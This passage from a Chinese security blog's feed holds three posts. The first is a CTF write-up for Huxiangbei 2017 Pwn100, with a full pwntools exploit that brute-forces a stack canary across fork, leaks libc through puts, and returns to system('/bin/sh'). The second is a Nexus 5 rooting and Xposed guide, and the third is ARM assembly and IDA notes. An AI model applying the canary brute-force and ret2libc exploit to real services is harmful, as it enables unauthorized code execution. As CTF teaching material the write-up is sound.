            
        </tags>
      
    </entry>
    
    <entry>
      <title>ctf canary绕过及湖湘杯Pwn100 writeup</title>
      <link href="/2018/01/24/stack_canary1/"/>
      <url>/2018/01/24/stack_canary1/</url>
      <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn100h" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/湖湘杯2017/pwn100h</a></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>先随手输入测试一下<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr17snvcmj30pp0b9acu.jpg" alt=""><br>从结果来看很像栈溢出了。</p><h2 id="静态分析找到漏洞"><a href="#静态分析找到漏洞" class="headerlink" title="静态分析找到漏洞"></a>静态分析找到漏洞</h2><p>打开IDA查看代码<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr0sjo1l7j311s0zadmx.jpg" alt=""><br>找到main函数，跟进sub_8048B29()</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fnr0tqgpo7j30ys18camm.jpg" alt=""><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr0ui1ac2j31h20mwq9c.jpg" alt=""><br>跟进去找到输入点，可以看到最大可以输入512字节的数据，对于输入格式的要求是能够进行base64解码。</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnr0r7kf7fj31c810swma.jpg" alt=""><br>根据我圈起来的地方基本上可以很明显的看出这是<strong>base64解密</strong>了</p><p>如果对base64还有不懂，可以参考<a href="http://blog.csdn.net/irwin_chen/article/details/9360845" target="_blank" rel="noopener">base64 c语言实现</a>和<a href="https://zh.wikipedia.org/wiki/Base64" target="_blank" rel="noopener">维基百科</a></p><h3 id="找到栈溢出"><a href="#找到栈溢出" class="headerlink" title="找到栈溢出"></a>找到栈溢出</h3><p><strong>base64解码的结果存入char数组v21[257],base64解码之后的数据大小大概是原来的3/4，足够造成栈溢出了。</strong><br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr14iu7elj30ty0hwdm4.jpg" alt=""><br>漏洞函数地址为0x080487E6</p><h3 id="分析下多进程"><a href="#分析下多进程" class="headerlink" title="分析下多进程"></a>分析下多进程</h3><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnr41wc79bj313i0wqk0a.jpg" alt=""></p><p>wait(0)函数的作用是等待任意一个子进程退出。<br><a href="http://www.cnblogs.com/linux-sir/archive/2012/01/27/2330014.html" target="_blank" rel="noopener">http://www.cnblogs.com/linux-sir/archive/2012/01/27/2330014.html</a></p><h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><h3 id="checksec查看开启了什么保护，这题的难点就在canary了。"><a href="#checksec查看开启了什么保护，这题的难点就在canary了。" class="headerlink" title="checksec查看开启了什么保护，这题的难点就在canary了。"></a>checksec查看开启了什么保护，这题的难点就在canary了。</h3><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnr1akx9snj30dq055q3h.jpg" alt=""></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>一般的思路是先leak出canary的cookie，然后在payload里，把原来的canary位置的cookie用我们leak出的正确的cookie写入，之后就是正常的rop。<br>不过这题,emmm，有个fork呀……参考这篇文章<a href="http://0x48.pw/2017/03/14/0x2d/，直接爆破canary" target="_blank" rel="noopener">http://0x48.pw/2017/03/14/0x2d/，直接爆破canary</a><br>这是个32位的程序，所以canary有4个字节，最低位一定是\x00，所以只需要爆破三个字节即可。<br>构造爆破payload格式为：<strong>padding+canary+chr(i)</strong><br>（canary的玩法不要太多，可以参考这篇文章：<a href="http://veritas501.space/2017/04/28/论canary的几种玩法/" target="_blank" rel="noopener">http://veritas501.space/2017/04/28/论canary的几种玩法/</a></p><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>先找到padding的大小<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnr1qtw88zj30tg0ge0w1.jpg" alt=""><br>再看看canary在哪，在数组旁边。<br><img src="https://ws3.sinaimg.cn/large/006tKfTcly1fnr28jztrzj30us04iabg.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnr2app7duj30kq09sacp.jpg" alt=""><br>所以我们的padding大小就是257字节了。<br>再重复一遍，<strong>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。 那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</strong></p><p>爆破函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">canary = &apos;\x00&apos;</span><br><span class="line">p.recvuntil(&apos;May be I can know if you give me some data[Y/N]\n&apos;)</span><br><span class="line">for i in xrange(3):</span><br><span class="line">    for j in xrange(256):</span><br><span class="line">        p.send(&apos;Y\n&apos;)</span><br><span class="line">        p.send(b64encode(&apos;a&apos;*257+ canary + chr(j)))</span><br><span class="line">        recv =p.recvuntil(&apos;May be I can know if you give me some data[Y/N]\n&apos;)</span><br><span class="line">        if &apos;Finish&apos; in recv:</span><br><span class="line">            canary += chr(j)</span><br><span class="line">            break</span><br><span class="line">print &apos;find canary:&apos;+canary.encode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure></p><h3 id="构造rop"><a href="#构造rop" class="headerlink" title="构造rop"></a>构造rop</h3><p>关于构造rop可以参考蒸米的文章：<a href="https://yq.aliyun.com/articles/58699" target="_blank" rel="noopener">https://yq.aliyun.com/articles/58699</a><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnr4n4z0l8j30bc0exgme.jpg" alt=""></p><h4 id="leak出puts函数的地址"><a href="#leak出puts函数的地址" class="headerlink" title="leak出puts函数的地址"></a>leak出puts函数的地址</h4><p>所以我们的payload1格式就是rop = padding + canary + padding + puts_plt_addr + 漏洞函数地址 + puts_got_addr(作为puts的参数）</p><h4 id="计算system地址和在libc里找到’-bin-sh’地址"><a href="#计算system地址和在libc里找到’-bin-sh’地址" class="headerlink" title="计算system地址和在libc里找到’/bin/sh’地址"></a>计算system地址和在libc里找到’/bin/sh’地址</h4><p><code>libc.symbols[&#39;system&#39;] - libc.symbols[&#39;puts&#39;] + u32(puts_addr)</code><br><code>next(libc.search(&#39;/bin/sh&#39;)- libc.symbols[&#39;puts&#39;] + u32(puts_addr)</code></p><h4 id="return-to-system，getshell"><a href="#return-to-system，getshell" class="headerlink" title="return to system，getshell"></a>return to system，getshell</h4><p>payload2格式为rop=padding+canary+padding+system_addr+padding+sh_addr<br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnr5tbhz4nj30m10dpdhn.jpg" alt=""></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwns'</span>)</span><br><span class="line"><span class="comment"># libc = ELF('libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">puts_plt_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got_addr = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">vulc_addr = <span class="number">0x080487E6</span></span><br><span class="line">p = process(<span class="string">'./pwns'</span>)</span><br><span class="line"><span class="comment"># brute</span></span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line">p.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">        p.send(<span class="string">'Y\n'</span>)</span><br><span class="line">        p.send(b64encode(<span class="string">'a'</span>*<span class="number">257</span>+ canary + chr(j)))</span><br><span class="line">        recv =p.recvuntil(<span class="string">'May be I can know if you give me some data[Y/N]\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Finish'</span> <span class="keyword">in</span> recv:</span><br><span class="line">            canary += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'find canary:'</span>+canary.encode(<span class="string">'hex'</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">257</span>+ canary +<span class="string">'a'</span>*<span class="number">12</span>+flat(puts_plt_addr,vulc_addr,puts_got_addr)</span><br><span class="line">p.send(<span class="string">'Y\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give me some datas:\n\n'</span>)</span><br><span class="line">p.send(b64encode(payload1))</span><br><span class="line">puts_addr = p.recv()[<span class="number">268</span>:<span class="number">268</span>+<span class="number">4</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'puts'</span>] + u32(puts_addr)</span><br><span class="line">sh_addr = next(libc.search(<span class="string">'/bin/sh'</span>))- libc.symbols[<span class="string">'puts'</span>] + u32(puts_addr)</span><br><span class="line">p.send(<span class="string">'Y\n'</span>)</span><br><span class="line">p.send(<span class="string">'Y\n'</span>)</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">257</span>+canary+<span class="string">'a'</span>*<span class="number">12</span>+flat(system_addr,p32(<span class="number">1</span>),sh_addr)</span><br><span class="line">p.send(b64encode(payload2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>nexus5刷机、root及安装xposed</title>
      <link href="/2018/01/19/nexus51/"/>
      <url>/2018/01/19/nexus51/</url>
      <content type="html"><![CDATA[<h2 id="nexus5刷机"><a href="#nexus5刷机" class="headerlink" title="nexus5刷机"></a>nexus5刷机</h2><p><code>adb reboot bootloader</code><br><code>fastboot oem unlock</code><br>在这里根据不同的版本下载镜像：<a href="https://developers.google.com/android/images" target="_blank" rel="noopener">https://developers.google.com/android/images</a><br>nexus5是hammerhead<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fnxp4v77ouj30yu112gsd.jpg" alt=""><br>然后运行flash-all.sh脚本即可刷机</p><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><h3 id="下载root工具包"><a href="#下载root工具包" class="headerlink" title="下载root工具包"></a>下载root工具包</h3><p><a href="https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF-Auto-Root-hammerhead-hammerhead-nexus5.zip" target="_blank" rel="noopener">https://download.chainfire.eu/363/CF-Root/CF-Auto-Root/CF-Auto-Root-hammerhead-hammerhead-nexus5.zip</a></p><h3 id="运行root-脚本"><a href="#运行root-脚本" class="headerlink" title="运行root 脚本"></a>运行root 脚本</h3><p><code>adb reboot bootloader</code><br>命令行进入解压下载的工具包中<code>chmod +x root-mac.sh</code><br><code>./root-mac.sh</code><br>手机出现红色android,等待重启,查看是否已安装SuperSu权限管理工具</p><h2 id="安装xposed（Android-4-0-3-up-to-Android-4-4"><a href="#安装xposed（Android-4-0-3-up-to-Android-4-4" class="headerlink" title="安装xposed（Android 4.0.3 up to Android 4.4)"></a>安装xposed（Android 4.0.3 up to Android 4.4)</h2><p><strong>关于xposed，有两种安装方法，对于低版本，直接安装xposed install即可，高版本需要刷入twrp（见下）</strong><br><a href="http://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">http://repo.xposed.info/module/de.robv.android.xposed.installer</a><br><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fnxqd7t0wjj31jy1fmqeu.jpg" alt=""><br><code>adb install xx.apk</code>安装即可</p><h2 id="安装xposed-Android-5-0-1，更高版本类似"><a href="#安装xposed-Android-5-0-1，更高版本类似" class="headerlink" title="安装xposed (Android 5.0.1，更高版本类似)"></a>安装xposed (Android 5.0.1，更高版本类似)</h2><h2 id="下载twrp"><a href="#下载twrp" class="headerlink" title="下载twrp"></a>下载twrp</h2><p>下载你的设备对应的<a href="https://twrp.me/Devices/" target="_blank" rel="noopener">twrp</a>,比如选择的是Google Nexus5，twrp-3.0.2-0-hammerhead.img</p><ul><li>进入bootloader刷机界面<br><code>adb reboot bootloader</code></li><li>输入以下指令fastboot devices判断设备是否连接</li><li><p>刷入TWRP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastboot flash recovery twrp-3.0.2-0-hammerhead.img</span><br><span class="line">fastboot reboot</span><br></pre></td></tr></table></figure></li><li><p>进入刷机界面<br><code>adb reboot recovery</code></p><h2 id="下载xposed框架和应用"><a href="#下载xposed框架和应用" class="headerlink" title="下载xposed框架和应用"></a>下载xposed框架和应用</h2><h3 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h3><p>官方下载地址<a href="https://forum.xda-developers.com/showthread.php?t=3034811" target="_blank" rel="noopener">Xposed for Lollipop and Marshmallow</a><br>根据设备CPU型号下载对应的框架和应用,比如如果是nexus5 android5.0.1，选择<a href="http://dl-xda.xposed.info/framework/sdk21/arm/xposed-v86-sdk21-arm.zip" target="_blank" rel="noopener">xposed-v86-sdk21-arm.zip</a>和<a href="https://forum.xda-developers.com/attachment.php?attachmentid=4393082&amp;d=1516301692" target="_blank" rel="noopener">XposedInstaller_3.1.apk</a></p></li></ul><h3 id="将xposed-v86-sdk21-arm-zip-push到手机中"><a href="#将xposed-v86-sdk21-arm-zip-push到手机中" class="headerlink" title="将xposed-v86-sdk21-arm.zip push到手机中"></a>将xposed-v86-sdk21-arm.zip push到手机中</h3><p><code>adb push xposed-v86-sdk21-arm.zip /sdcard</code><br>在twrp点击install ,选中xposed-v86-sdk21-arm.zip,然后点击flash,完成后重启</p><h3 id="安装XposedInstaller-3-1-apk"><a href="#安装XposedInstaller-3-1-apk" class="headerlink" title="安装XposedInstaller_3.1.apk"></a>安装XposedInstaller_3.1.apk</h3><p><code>adb install XposedInstaller_3.1.apk</code><br>安装完成后打开应用查看是否已激活</p><h2 id="提供其他的一些参考"><a href="#提供其他的一些参考" class="headerlink" title="提供其他的一些参考"></a>提供其他的一些参考</h2><p><a href="http://bbs.gfan.com/android-7599937-1-1.html" target="_blank" rel="noopener">http://bbs.gfan.com/android-7599937-1-1.html</a><br><a href="http://bbs.gfan.com/android-7537408-1-1.html" target="_blank" rel="noopener">http://bbs.gfan.com/android-7537408-1-1.html</a></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xposed </tag>
            
            <tag> 刷机 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>arm汇编学习（一）</title>
      <link href="/2018/01/18/arm1/"/>
      <url>/2018/01/18/arm1/</url>
      <content type="html"><![CDATA[<h1 id="arm汇编"><a href="#arm汇编" class="headerlink" title="arm汇编"></a>arm汇编</h1><h2 id="Android-Native-进程启动流程"><a href="#Android-Native-进程启动流程" class="headerlink" title="Android Native 进程启动流程"></a>Android Native 进程启动流程</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/8ek7b9Jk2K.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/mJkdiFL95I.png?imageslim" alt="mark"></p><p>ARM传参，R0-R3传递前四个参数</p><h3 id="1-Thumb-指令集特点"><a href="#1-Thumb-指令集特点" class="headerlink" title="1. Thumb 指令集特点"></a>1. Thumb 指令集特点</h3><ul><li>Thumb 指令集指令长度：16或32，16为为主</li><li>Thumb-16 大部分只能访问前8个寄存器 R0-R7（少数可以访问R8-R15）</li><li>Thumb-32 可以访问所有的ARM core 寄存器 R0-R15</li></ul><p>更小、更加灵活</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/3F7Kh72CcJ.png?imageslim" alt="mark"></p><h3 id="2-ARM指令集特点"><a href="#2-ARM指令集特点" class="headerlink" title="2. ARM指令集特点"></a>2. ARM指令集特点</h3><ul><li>指令长度32位，4字节对齐</li><li>功能更加完善</li></ul><h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><table><thead><tr><th>Thumb</th><th>ARM</th></tr></thead><tbody><tr><td>2字节对齐</td><td>4字节对齐</td></tr><tr><td>占用空间少、密度高</td><td>占用空间较多</td></tr><tr><td>功能不齐全</td><td>功能齐全</td></tr></tbody></table><p>ARM和Thumb指令集各有自己的优点，取长补短往往会得到最好的性能</p><h3 id="3-Opcod-中判断指令集"><a href="#3-Opcod-中判断指令集" class="headerlink" title="3. Opcod 中判断指令集"></a>3. Opcod 中判断指令集</h3><ul><li>Opcode[15:13]== 111 &amp;&amp; Opcode[12:11]!= 00 满足则为32bit 的ARM</li><li>bl #0x80000fbc</li><li>0xed 0xff 0xff 0xeb</li><li><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180115/HefgcabdgD.png?imageslim" alt="mark"></li></ul><h3 id="4-IDA-中识别与切换指令集"><a href="#4-IDA-中识别与切换指令集" class="headerlink" title="4. IDA 中识别与切换指令集"></a>4. IDA 中识别与切换指令集</h3><ul><li>Edit-&gt;segments-&gt;change segment register value(快捷键ALT+G)</li><li>请看操作。</li></ul><p>这有一段指令，判断出目前是thumb指令集的</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/bDfa164Gm2.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/L44GbeBb0g.png?imageslim" alt="mark"></p><p>按下ALT+G,把0x1改成0x0，就是指定为ARM指令集</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/m6cmAKf7f1.png?imageslim" alt="mark"></p><p>然后按下P键定义函数，函数参数就都分析出来了（</p><h3 id="5-ARM切换指令集原理"><a href="#5-ARM切换指令集原理" class="headerlink" title="5. ARM切换指令集原理"></a>5. ARM切换指令集原理</h3><ul><li>处理器无论在ARM还是Thumb状态下都可以通过BX/BLX/LDR/LDM切换不同的指令集。</li><li>状态切换是由寄存器Rn的最低位来指定的，如果操作数寄存器的状态位Bit0=0，则进入ARM状态，如果Bit0=1，则进入Thumb状态。</li></ul><h3 id="ARM-中对于字节、字、双字的定义"><a href="#ARM-中对于字节、字、双字的定义" class="headerlink" title="ARM 中对于字节、字、双字的定义"></a>ARM 中对于字节、字、双字的定义</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/42LgAImG8C.png?imageslim" alt="mark"></p><p>注意和intel汇编的区别，一个word(字)这里是4个字节</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/k6BCjcgdHD.png?imageslim" alt="mark"></p><p><strong>但是注意一下，在IDA中依然延续着老的传统，一个DCW(word)代表两个字节</strong></p><ul><li><strong>DCB  定义1字节数据</strong></li><li><strong>DCW  定义2字节数据</strong></li><li><strong>DCD  定义4字节数据</strong></li><li><strong>在IDA中，在上面这些数据定义上按下D键可以切换定义的类型</strong></li><li><strong>Array 定义数组，右键或*号键</strong></li></ul><p>数组最常见的就在数组，</p><h2 id="IDA中的自定义数据类型"><a href="#IDA中的自定义数据类型" class="headerlink" title="IDA中的自定义数据类型"></a>IDA中的自定义数据类型</h2><p><strong>Structures 窗口中可以创建一个自定义结构体。按下I或者Ins键即可创建。</strong></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/JGdKAA9LFK.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/6BhFchfIi3.png?imageslim" alt="mark"></p><p>创建了一个名为test的结构体</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/dK8d27jgfb.png?imageslim" alt="mark"></p><p>因为没有定义字段，所以现在都还是空的，结构体长度为0（相当于空结构体，没有任何内容）</p><p>所以去定义字段。</p><h3 id="为自定义数据类型添加字段"><a href="#为自定义数据类型添加字段" class="headerlink" title="为自定义数据类型添加字段"></a>为自定义数据类型添加字段</h3><p>创建完结构体后，长这样：</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/GmCIi75chL.png?imageslim" alt="mark"></p><p>在ends处按下D键就可以定义一个字段了，在字段上按D可以改变长度1/2/4</p><p>其他按键：</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/fJeKmkHmL6.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/Hl91i5EjJE.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/F9JfJKKKBG.png?imageslim" alt="mark"></p><p>这样就可以给一个变量转成自己的结构体类型</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/6llGaFG7k6.png?imageslim" alt="mark"></p><h3 id="应用自定义数据类型"><a href="#应用自定义数据类型" class="headerlink" title="应用自定义数据类型"></a>应用自定义数据类型</h3><p><strong>在起始数据处右键-&gt;Structure-&gt;自定义的数据类型</strong></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/e5bagIfbfD.png?imageslim" alt="mark"></p><h2 id="ARM汇编中的标志寄存器与条件代码"><a href="#ARM汇编中的标志寄存器与条件代码" class="headerlink" title="ARM汇编中的标志寄存器与条件代码"></a>ARM汇编中的标志寄存器与条件代码</h2><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><ul><li><strong>b指令</strong>：跳转</li><li><strong>bl指令</strong>：跳转且保存返回地址</li><li><strong>blx/bx指令</strong>：带x，可以切换指令集</li></ul><p><strong>分支指令例子：</strong></p><p><strong>beq</strong>=b+eq（equal)=b指令+条件助记符（参考下面的cond）</p><p><strong>ben</strong></p><h3 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h3><p><strong>ARM中大部分的指令都支持带条件执行。</strong></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/aFcH160afA.png?imageslim" alt="mark"></p><p>cond:前四位保存条件码</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/8ecida68KH.png?imageslim" alt="mark"></p><h3 id="比较指令的大用处"><a href="#比较指令的大用处" class="headerlink" title="比较指令的大用处"></a>比较指令的大用处</h3><p><strong>Compare 指令：cmp r0,#1</strong></p><p><strong>完成操作:</strong></p><ol><li>减法运算(不保存结果)</li><li>根据结果更新标志位</li></ol><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><h4 id="APSR-寄存器"><a href="#APSR-寄存器" class="headerlink" title="APSR 寄存器"></a>APSR 寄存器</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/I6IjBIEGhG.png?imageslim" alt="mark"></p><p><strong>标志寄存器是条件执行的基础。</strong><br>N、Z、C、V用于条件标志位<br>N - 负数标志位<br>Z - 零标志位<br>C - 进位标志位<br>V - 溢出标志位</p><p>比如，若减法运算之后为负数，则N为1；为0，则Z=1；</p><h5 id="一些会修改标志位的指令"><a href="#一些会修改标志位的指令" class="headerlink" title="一些会修改标志位的指令"></a>一些会修改标志位的指令</h5><p><strong>1. 指令后缀带S的指令，例如(MOVS)</strong></p><p><strong>2. TST(and)、TEQ(or)、CMN(add)、CMP(sub)</strong></p><p>例如MOVS之后的到的值为0，那么Z就被置位（为1）</p><p><strong>完整一点的例子</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/debffk3A60.png?imageslim" alt="完整一点的例子"></p><blockquote><p>这里if有两种可能，一种是a&lt;=10，一种是a&gt;10；</p><p>在汇编中<strong>先cmp a,#10</strong></p><p>然后<strong>选择if括号内相反的选项</strong> bgt next1 (大于则跳转出去)</p><p>然后在这<strong>中间填入if代码块中的内容</strong></p></blockquote><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><p><strong>打开程序</strong></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/eAf963eelJ.png?imageslim" alt="mark"></p><p><strong>导出表</strong></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/65Ab19GkKH.png?imageslim" alt="mark"></p><p><a href="http://blog.csdn.net/hgy413/article/details/6598043" target="_blank" rel="noopener">http://blog.csdn.net/hgy413/article/details/6598043</a></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/ijeK017DDJ.png?imageslim" alt="mark"></p><p><strong>libc</strong>init的第三个参数（R2）是main函数的地址</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/kljAI65kFj.png?imageslim" alt="mark"></p><p>跳入main函数之后发现IDA未能把ARM指令集识别正确。需要手动（ALT+G) </p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/DLeG0i8IIb.png?imageslim" alt="mark"></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/dmfLIFbgC6.png?imageslim" alt="mark"></p><p>随便输入一个不等于0x0的数</p><p>全部改好之后就识别出来了</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/2JFelgFi6a.png?imageslim" alt="mark"></p><p><strong>程序源码</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">0</span>,b = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This is condition statements re test!\nPlease input two number:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;a,&amp;b);</span><br><span class="line"><span class="keyword">if</span>(a + b == <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[if]a+b=10\b"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[if-else-1]a &gt; b\n"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(a == b)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[if-else-if] a==b\n"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[if-else] a&lt;b \n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a &lt;= <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[nest if]\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a &gt; 10\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>自己调试一下</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180118/I58CbF6A6C.png?imageslim" alt="mark"></p><h2 